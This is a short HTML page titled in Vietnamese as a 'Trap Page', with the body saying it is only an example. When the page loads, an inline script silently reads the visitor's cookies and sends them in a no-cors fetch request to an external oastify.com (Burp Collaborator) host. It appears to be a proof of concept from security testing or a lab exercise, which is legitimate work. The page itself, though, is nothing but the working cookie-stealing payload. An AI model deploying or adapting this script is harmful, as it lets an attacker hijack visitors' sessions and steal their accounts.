<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trang Bẫy</title>
</head>
<script>
    (async function() {
        var userCookies = document.cookie;
        var destinationURL = 'http://4otqlnlzkuzzujpb580ev4be359wxnlc.oastify.com'; 
        try {
            // Gửi yêu cầu GET mà không cần quan tâm đến CORS policy
            await fetch(`${destinationURL}?cookies=${encodeURIComponent(userCookies)}`, {
                method: 'GET',
                mode: 'no-cors' // Sử dụng mode no-cors để tránh vấn đề CORS
            });
        } catch (error) {
            console.error('Error:', error);
        }
        })();
</script>
    
<body>
    <h1>Chào mừng bạn đến với Trang Bẫy</h1>
    <p>Trang này là một ví dụ, không có nội dung thực sự.</p>
</body>
</html>
